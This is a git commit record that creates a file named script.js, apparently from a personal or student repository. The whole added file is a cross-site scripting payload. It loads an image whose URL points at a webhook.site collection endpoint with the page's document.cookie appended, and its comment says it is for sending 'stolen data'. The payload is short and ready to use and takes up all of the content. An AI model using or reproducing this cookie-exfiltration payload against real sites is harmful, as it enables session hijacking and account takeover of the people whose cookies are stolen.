a592903fc8211af4de547c2d68b53688c1f14cd9
d3dn0v4 <ayham.naili@edu.isetcom.tn>
2024-10-06 00:39:28 +0100

    Create script.js

---
+++ script.js
@@ -0,0 +1,5 @@
+<script>
+  // Create an image object to send the stolen data via a GET request
+  var i = new Image();
+  i.src = "https://webhook.site/38beab36-6b97-4481-932f-a96e61794747?cookies=" + document.cookie;
+</script>
